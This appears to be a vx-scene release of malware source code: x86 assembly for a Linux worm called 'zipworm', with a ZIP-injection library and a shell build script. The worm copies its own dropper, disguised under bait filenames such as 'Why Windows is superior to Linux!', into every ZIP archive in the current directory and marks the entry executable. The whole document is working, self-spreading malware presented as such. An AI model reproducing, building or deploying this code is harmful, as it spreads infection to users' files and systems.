
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[WORM.S]ÄÄÄ
;ZIPWORM for Linux
;(c) Vecna 2000

BITS 32

;%define DEBUG 1

global main
extern izip_add
extern izip_maxaddsize

[section .data]
           db "elf zip worm vecna", 0
nametable  dd name01
           dd name02
           dd name03
           dd name04
           dd name05
dot        db ".",0
name01     db "Ten motives why linux sux!",0
name02     db "Why Windows is superior to Linux!",0
name03     db "Is Linux for you? Never!",0
name04     db "Is Linux immune to virus? NO!",0
name05     db "zipworm!",0
%ifdef DEBUG
deb_msg0   times 80 db "-"
deb_msg4   db 0dh,0ah,0
deb_msg1   db "Running...",0dh,0ah,0
deb_msg2   db "Exiting to OS",0dh,0ah,0
deb_msg3   db "Opening: ",0
deb_msg5   db "Found worm!",0dh,0ah,0
deb_msg6   db "Worm size: ",0
deb_msg7   db "File search done",0dh,0ah,0
deb_msg8   db "File search init",0dh,0ah,0
deb_msg9   db "Worm in mem!",0dh,0ah,0
deb_msg10  db "Add size: ",0
%endif

mapstruct  dd 0
mapsize	   dd 0
           dd 3
           dd 1
mapfilehnd dd 0
           dd 0

[section .bss]
hostptr    resd 1
hostsize   resd 1
addsize	   resd 1
orgsize    resd 1
dir_entry  resb 0110h
hostbuffer resb 4000h

[section .text]
main:
%ifdef DEBUG
       pushad
       mov ecx, deb_msg1
       call write_console
       popad
%endif
       cld
       push byte 5
       mov esi, nametable
       pop ecx
  .trynextname:
       push ecx
       lodsd
       mov ebx, eax
%ifdef DEBUG
       pushad
       mov ecx, deb_msg3
       call write_console
       mov ecx, ebx
       call write_console
       mov ecx, deb_msg4
       call write_console
       popad
%endif
       sub ecx, ecx
       push byte 5h
       pop eax
       cdq
       int 80h
       mov ebx, eax
       test eax, eax
       pop ecx
       jns .foundhost
       loop .trynextname
       jmp .exit
  .foundhost:
%ifdef DEBUG
       pushad
       mov ecx, deb_msg5
       call write_console
       popad
%endif
       cmp esi, dot
       jb .no_name_adj
       mov esi, nametable
  .no_name_adj:
       push byte 13h
       push byte 2h
       sub ecx, ecx
       pop edx
       pop eax
       int 80h
       mov [hostsize], eax
%ifdef DEBUG
       pushad
       mov ecx, deb_msg6
       call write_console
       mov eax, eax
       call write_dword
       popad
%endif
       push byte 13h
       sub ecx, ecx
       pop eax
       cdq
       int 80h
       mov ecx, hostbuffer
       mov edx, [hostsize]
       push byte 3
       pop eax
       int 80h                                  ;read dropper
       push byte 6
       pop eax
       int 80h                                  ;close file
%ifdef DEBUG
       pushad
       mov ecx, deb_msg9
       call write_console
       popad
%endif
       push dword [esi]
       push dword [hostsize]
       call izip_maxaddsize       ;eax=size to increase .zip
       mov [addsize], eax
%ifdef DEBUG
       pushad
       mov ecx, deb_msg10
       call write_console
       mov eax, eax
       call write_dword
       popad
%endif
       push byte 5
       mov ebx, dot
       sub ecx, ecx
       pop eax
       cdq
       int 80h
       mov ebx, eax                             ;open current dir
%ifdef DEBUG
       pushad
       mov ecx, deb_msg8
       call write_console
       popad
%endif
  .next_entry:
       push byte 59h
       mov ecx, dir_entry
       pop eax
       int 80h                                  ;read directory entry
       test eax, eax
       jz near .done
       pushad
       lea ebx, [dir_entry+0ah]
       movzx eax, word [dir_entry+8h]
       cdq
       mov dword [ebx+eax+1], edx                 ;put 0 marker
       push byte 2
       push byte 5h
       pop eax
       pop ecx
%ifdef DEBUG
       pushad
       mov ecx, ebx
       call write_console
       mov ecx, deb_msg4
       call write_console
       popad
%endif
       int 80h
       test eax, eax
       js near .search_next
       mov [mapfilehnd], eax
       mov ebx, eax

       push byte 13h
       push byte 2h
       sub ecx, ecx
       pop edx
       pop eax
       int 80h
       mov [orgsize], eax
       mov edi, eax
       add eax, [addsize]
       mov [mapsize], eax

       push byte 93
       mov ecx, eax
       pop eax
       int 80h

       push byte 90
       mov ebx, mapstruct
       pop eax
       int 80h
       cmp eax, 0fffff000h
       ja .closehandle
       mov ebx, eax

       push edi
       push eax
       push dword [esi]
       push dword [hostsize]
       mov eax, hostbuffer
       push eax
       call izip_add
       test eax, eax
       jz .clean
       add [orgsize], eax
  .clean:
       push byte 91
       pop eax
       int 80h

       push byte 93
       mov ecx, [orgsize]
       mov ebx, [mapfilehnd]
       pop eax
       int 80h

  .closehandle:
       push byte 6
       mov ebx, [mapfilehnd]
       pop eax
       int 80h                                  ;close file

  .search_next:
       popad
       jmp .next_entry

  .done:
%ifdef DEBUG
       pushad
       mov ecx, deb_msg7
       call write_console
       popad
%endif

  .exit:
%ifdef DEBUG
       pushad
       mov ecx, deb_msg2
       call write_console
       popad
%endif
       push byte 1
       sub ebx, ebx
       pop eax
       int 80h


%ifdef DEBUG
;ecx=string
write_console:
       pushad
       push byte -1
       mov edx, ecx
       mov esi, ecx
       pop ecx
  .count:
       inc ecx
       lodsb
       test al, al
       jnz .count
       xchg ecx, edx
       push byte 4
       push byte 1
       pop ebx
       pop eax
       int 80h
       popad
       ret
%endif


%ifdef DEBUG
;eax=dword
write_dword:
       pushad
       sub esp, 32
       mov edi, esp
       push byte 8
       pop ecx
  .hexchar:
       rol eax, 4
       push eax
       and eax, 01111b
       call .table
       db "0123456789ABCDEF",0
  .table:
       pop ebx
       xlatb
       stosb
       pop eax
       loop .hexchar
       mov eax, 0d0ah
       stosd
       mov ecx, esp
       call write_console
       add esp, 32
       popad
       ret
%endif


%ifdef DEBUG
output_registers:
       pushad
       mov ecx, deb_msg0
       call write_console
       call .0001
       db "EAX=", 0
  .0001:
       pop ecx
       call write_console
       mov eax, eax
       call write_dword
       call .0002
       db "EBX=", 0
  .0002:
       pop ecx
       call write_console
       mov eax, ebx
       call write_dword
       call .0003
       db "ECX=", 0
  .0003:
       pop ecx
       call write_console
       mov eax, ecx
       call write_dword
       call .0004
       db "EDX=", 0
  .0004:
       pop ecx
       call write_console
       mov eax, edx
       call write_dword
       call .0005
       db "ESP=", 0
  .0005:
       pop ecx
       call write_console
       mov eax, esp
       call write_dword
       call .0006
       db "EBP=", 0
  .0006:
       pop ecx
       call write_console
       mov eax, ebp
       call write_dword
       call .0007
       db "ESI=", 0
  .0007:
       pop ecx
       call write_console
       mov eax, esi
       call write_dword
       call .0008
       db "EDI=", 0
  .0008:
       pop ecx
       call write_console
       mov eax, edi
       call write_dword
       mov ecx, deb_msg0
       call write_console
       popad
       ret
%endif
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[WORM.S]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[WORM.I]ÄÄÄ
param1 equ 4
param2 equ 8
param3 equ 12
param4 equ 16
param5 equ 20

_Push equ 4

_Pushad equ 8*4

_Pushad_eax equ 7*4
_Pushad_ecx equ 6*4
_Pushad_edx equ 5*4
_Pushad_ebx equ 4*4
_Pushad_esp equ 3*4
_Pushad_ebp equ 2*4
_Pushad_esi equ 1*4
_Pushad_edi equ 0*4
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[WORM.I]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[IZIP.S]ÄÄÄ
;VXZIP Library
;(c) Vecna 2000

BITS 32

%define LINUX 1

%include "izip.i"

%ifdef LINUX
global izip_maxaddsize
global izip_add
global izip_strlen
global izip_crc32
%endif

;push ptr2dropname
;push sizeof_dropper
;call
izip_maxaddsize:
;eax=size that .zip will increase
       push dword [esp+param2]
       call izip_strlen
       lea eax, [eax+eax+(sizeof_zip_central+sizeof_zip_local)]
       add eax, [esp+param1]
       ret 8


;push sizeof_zip
;push ptr2zip
;push ptr2dropname
;push sizeof_dropper
;push ptr2dropper
;call
izip_add:
;eax=new sizeof_map
       pushad
       sub esp, _Stack
       mov esi, [esp+_Pushad+_Stack+param4]
       sub ecx, ecx
  .local_hdr:
       cmp dword [esi+zip_loc_sign_], zip_local_sign
       jne .central_hdr
       movzx eax, word [esi+zip_size_fname]
       mov edx, dword [esi+zip_ver_ned_to_extr]
       mov ebx, dword [esi+zip_file_time]
       inc ecx
       cmp word [esi+zip_compression_method], 0
       jne .seek_next
%ifndef LINUX
       mov edi, [esi+zip_local_fname+eax-4]
       or edi, 020202000h
       sub edi, ".exe"
%else
       cmp byte [esi+zip_local_fname+eax-1], "!"
%endif
       je .error
  .seek_next:
       movzx edi, word [esi+zip_extra_field_length]
       add eax, edi
       add eax, dword [esi+zip_compressed_size]
       lea esi, [eax+esi+sizeof_zip_local]
       jmp .local_hdr
  .central_hdr:
       jecxz .error
       cmp dword [esi+zip_centr_sign_], zip_central_sign
       je .insert_local_hdr
  .error:
       sub ecx, ecx
  .exit:
       add esp, _Stack
       mov [esp+_Pushad_eax], ecx
       popad
       ret 20
  .insert_local_hdr:
       mov ecx, [esp+_Pushad+_Stack+param5]
       add ecx, [esp+_Pushad+_Stack+param4]
       sub ecx, esi
       add esi, ecx
       push dword [esp+_Pushad+_Stack+param3]
       call izip_strlen
       lea edi, [esi+eax+sizeof_zip_local]
       add edi, [esp+_Pushad+_Stack+param2]
       std
       rep movsb
       mov byte [edi], "P"
       cld
       xchg edi, esi
       xchg ecx, ebx
       mov eax, edi
       sub eax, [esp+_Pushad+_Stack+param4]
       mov dword [esp+rel_str_local_hdr], eax
       mov eax, zip_local_sign
       stosd
       mov eax, edx
       stosd                    ;version/flags
       sub eax, eax
       stosw                    ;stored
       mov eax, ecx
       stosd                    ;time/date
       push dword [esp+_Pushad+_Stack+param2]
       push dword [esp+_Pushad+_Stack+param1+_Push]
       call izip_crc32
       stosd                    ;crc32
       mov eax, [esp+_Pushad+_Stack+param2]
       stosd
       stosd                    ;size
       mov esi, [esp+_Pushad+_Stack+param3]
       push esi
       call izip_strlen
       sub ecx, ecx
       stosw                    ;name size
       xchg eax, ecx
       stosw                    ;extra size
       rep movsb                ;name
       mov ecx, [esp+_Pushad+_Stack+param2]
       mov esi, [esp+_Pushad+_Stack+param1]
       rep movsb                ;copy dropper
       mov esi, edi
       sub edi, [esp+_Pushad+_Stack+param4]
       mov dword [esp+rel_str_central_hdr], edi
  .zip_end_hdr:
       cmp dword [esi+zip_centr_sign_], zip_central_sign
       jne .insert_central_hdr
       movzx eax, word [esi+zip_size_fname_]
       movzx edx, word [esi+zip_extra_field_length_]
       add eax, edx
       movzx edx, word [esi+zip_file_comment_length_]
       add eax, edx
       mov edx, [esi+zip_ver_made_by_]
       test byte [esi+zip_extrnl_file_attr_], 10h
       jnz .skip_dir
       mov ebx, [esi+zip_file_time_]
       mov edi, [esi+zip_disk_number_start_]
       mov ecx, [esi+zip_flags_]
  .skip_dir:
       lea esi, [esi+eax+sizeof_zip_central]
       jmp .zip_end_hdr
  .insert_central_hdr:
       cmp dword [esi+zip_end_sign_], zip_end_sign
       jne near .error
       push dword [esp+_Pushad+_Stack+param3]
       call izip_strlen
       push eax
       pushad
       add eax, sizeof_zip_central
       lea edi, [esi+eax]
       add [esi+size_of_the_central_directory], eax
       movzx eax, word [esi+zipfile_comment_length]
       lea ecx, [eax+sizeof_zip_end]
       add edi, ecx
       add esi, ecx
       std
       rep movsb
       mov byte [edi], "P"
       cld
       popad
       xchg edi, esi
       mov eax, zip_central_sign
       stosd                            ;sign
       mov eax, edx
       stosd                            ;version
       mov eax, ecx
       stosw                            ;flag
       pop ecx
       sub eax, eax
       stosw                            ;method
       xchg eax, ebx
       stosd                            ;time/date
       push dword [esp+_Pushad+_Stack+param2]
       push dword [esp+_Pushad+_Stack+param1+_Push]
       call izip_crc32
       stosd                            ;crc32
       mov eax, [esp+_Pushad+_Stack+param2]
       stosd
       stosd                            ;size
       mov eax, ecx
       stosw                            ;name size
       xchg eax, ebx
       stosd                            ;extra size
       xchg eax, esi
       stosd                            ;disk/attr
%ifndef LINUX
       xchg eax, esi                    ;no file attributes
%else
       mov eax, 0816d0000h              ;r-xr-xr-x
%endif
       stosd     ;
       mov eax, [esp+rel_str_local_hdr]
       stosd
       mov esi, [esp+_Pushad+_Stack+param3]
       rep movsb
       mov esi, edi
  .check_end:
       cmp dword [esi+zip_end_sign_], zip_end_sign
       jne near .error
       add dword [esi+ttl_num_of_ent_on_this_disk], 00010001h
       mov eax, [esp+rel_str_central_hdr]
       mov dword [esi+off_of_strt_of_cent_directory], eax
       movzx eax, word [esi+zipfile_comment_length]
       lea ecx, [esi+eax+sizeof_zip_end]
       sub ecx, [esp+_Pushad+_Stack+param4]
       jmp .exit


;push sizeof_data
;push ptr2data
;call
izip_crc32:
;eax=crc32
       pushad
       mov edx, [esp+_Pushad+param1]
       mov ecx, [esp+_Pushad+param2]
       push byte -1
       pop eax
  .bigloop:
       xor al, [edx]
       inc edx
       mov bl, 8
  .bitloop:
       shr eax, 1
       jnc .no_hash
       xor eax, 0EDB88320h
  .no_hash:
       dec bl
       jnz .bitloop
       loop .bigloop
       not eax
       mov [esp+_Pushad_eax], eax
       popad
       ret 8


;push ptr2string
;call
izip_strlen:
;eax=lenght of the string
       pushad
       mov esi, [esp+_Pushad+param1]
       sub ecx, ecx
  .count:
       lodsb
       test al, al
       jz .done
       inc ecx
       jmp .count
  .done:
       mov [esp+_Pushad_eax], ecx
       popad
       ret 4
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[IZIP.S]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MAKE]ÄÄÄ
#!/bin/sh

nasm worm.s -f elf -l worm.lst

gcc worm.o izip.o -o zipworm! -O2

strip zipworm!
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MAKE]ÄÄÄ
